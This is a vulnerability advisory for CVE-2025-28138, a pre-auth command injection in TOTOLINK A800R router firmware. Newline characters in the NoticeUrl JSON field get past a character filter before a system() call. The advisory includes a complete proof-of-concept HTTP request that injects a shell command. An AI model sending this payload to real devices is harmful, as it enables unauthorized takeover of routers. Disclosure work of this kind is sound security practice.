## RCE-TOTOLINK-A800R V4.1.2cu.5137_B20200730

system.so-setNoticeCfg-NoticeUrl

## CVE-ID
CVE-2025-28138

## PRODUCT

TOTOLINK

## Vendor of Product

https://www.totolink.net/

## VERSION

A800R V4.1.2cu.5137_B20200730

## Firmware

https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/166/ids/36.html

## Vulnerability Type

RCE

## Description

The TOTOLINK A800R V4.1.2cu.5137_B20200730 were found to contain a pre-auth remote command execution vulnerability in the setNoticeCfg function through the NoticeUrl parameter.

The NoticeUrl is user-controllable. The GetDomainName function extracts the domain part from the URL and assigns it to v36. Subsequently, it enters the validity_check function to verify whether special characters are present. If special characters are included, it directly returns.

This function can be bypassed using newline characters, and `\n` can be used in JSON data to achieve this.

![image](https://github.com/user-attachments/assets/7bf08f57-0d51-4db2-bc62-4c699aa52b89)


If no special characters are included, the process continues and triggers the `system` function.

![image](https://github.com/user-attachments/assets/7bb1332b-d08d-4290-ab18-16df913de1c0)


![image](https://github.com/user-attachments/assets/8e24113c-b601-4acf-a4bf-fb5dec2ad39c)
## POC
```
POST /cgi-bin/cstecgi.cgi HTTP/1.1

Host: 192.168.0.1

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Content-Type: application/x-www-form-urlencoded; charset=UTF-8

X-Requested-With: XMLHttpRequest

Content-Length: 135

Origin: http://192.168.0.1

Connection: keep-alive

Referer: http://192.168.0.1/firewall/url_filtering.asp?timestamp=1740669963073

Cookie: SESSION_ID=2:1604139547:2



{"topicurl":"setting/setNoticeCfg","NoticeUrl":"bbb\nls>/test\nbb.com","WhiteListUrl1":"1111",

"IpFrom":"123.123.123.0","IpTo":"aaaa"}
```
![image](https://github.com/user-attachments/assets/3f2527f2-ee2a-48ad-bdc1-d43d1a7f974d)



